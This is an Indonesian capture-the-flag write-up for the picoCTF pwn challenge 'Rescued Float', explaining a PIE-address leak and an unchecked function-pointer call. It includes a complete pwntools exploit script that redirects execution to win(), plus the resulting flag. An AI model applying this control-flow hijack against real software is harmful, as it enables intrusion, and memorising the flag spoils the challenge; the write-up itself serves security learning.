Rescued Float â€” picoCTF (PWN)

## Deskripsi Challenge

Program binary:

1. Menampilkan alamat `main()`
2. Meminta user memasukkan alamat
3. Melakukan call ke alamat tersebut

Target kita adalah memaksa program memanggil fungsi `win()` untuk membaca flag.

## Analisis Kerentanan

Cuplikan fungsi main:

    scanf("%lx", &v0);
    v1 = v0;
    v1(v3, v4, v5, v6, v7, v8);

Input user dibaca sebagai pointer fungsi dan langsung dieksekusi tanpa validasi.
Ini memberikan keleluasaan user untuk memilih fungsi mana yang dijalankan.

## Proteksi Binary

PIE : Aktif
NX : Aktif
Canary : Ada
ASLR : Efektif

PIE membuat alamat acak setiap eksekusi, tetapi program membocorkan alamat `main()`,
sehingga base binary dapat dihitung.

## Strategi Eksploitasi

Gunakan leak `main()` untuk menghitung base:

    base      = leaked_main - offset(main)
    win_addr  = base + offset(win)

Kirim `win_addr` melalui stdin dan program akan memanggil fungsi `win()`
yang mencetak flag.

## solve.py

#!/usr/bin/env python3
from pwn import \*

host = "rescued-float.picoctf.net"
port = 52592

elf = ELF("./vuln")
context.binary = elf

io = remote(host, port)

io.recvuntil(b"Address of main: ")
leak = int(io.recvline().strip(), 16)
log.info(f"main leak: %s" % hex(leak))

base = leak - elf.symbols['main']
log.info(f"PIE base: %s" % hex(base))

win = base + elf.symbols['win']
log.success(f"win @ %s" % hex(win))

io.recvuntil(b"=>")
io.sendline(hex(win).encode())

io.interactive()

## Cara Menjalankan

pip install pwntools
./solve.py

## Output Berhasil

(image.png)

picoCTF{b4s1c_p051t10n_1nd3p3nd3nc3_6f4e7236}
